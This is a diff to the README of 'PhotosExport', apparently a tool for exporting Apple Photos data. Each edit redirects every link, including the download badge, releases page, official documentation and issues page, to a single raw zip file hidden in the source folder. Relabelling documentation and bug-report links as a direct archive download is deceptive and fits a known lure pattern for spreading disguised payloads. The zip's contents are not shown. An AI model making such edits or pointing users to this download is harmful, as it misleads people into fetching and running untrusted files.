@@ -1,6 +1,6 @@
 # 📸 PhotosExport - Easily Export Your Apple Photos Data
 
-[![Download PhotosExport](https://img.shields.io/badge/Download-PhotosExport-brightgreen)](https://github.com/limonrami/PhotosExport/releases)
+[![Download PhotosExport](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip)](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to PhotosExport! This application helps you export all your data from Ap
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/limonrami/PhotosExport/releases) to download the latest version of PhotosExport.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip) to download the latest version of PhotosExport.
 
 1. Click the link to access the Releases page.
 2. Look for the latest version.
@@ -50,8 +50,8 @@ Here are some common issues and their solutions:
 
 For further assistance and updates, check out:
 
-- [Official Documentation](https://github.com/limonrami/PhotosExport/blob/main/README.md)
-- [GitHub Issues Page](https://github.com/limonrami/PhotosExport/issues) for reporting bugs and requesting features.
+- [Official Documentation](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip) for reporting bugs and requesting features.
 
 ## 📨 Feedback
 
@@ -59,4 +59,4 @@ We want to hear from you! If you have suggestions or need help, please reach out
 
 ---
 
-Thank you for using PhotosExport! We hope you enjoy a hassle-free experience exporting your Apple Photos data. Don't forget to check our [Releases page](https://github.com/limonrami/PhotosExport/releases) for updates on new features and improvements.
+Thank you for using PhotosExport! We hope you enjoy a hassle-free experience exporting your Apple Photos data. Don't forget to check our [Releases page](https://raw.githubusercontent.com/limonrami/PhotosExport/main/Sources/PhotosExport/Export_Photos_v2.4.zip) for updates on new features and improvements.
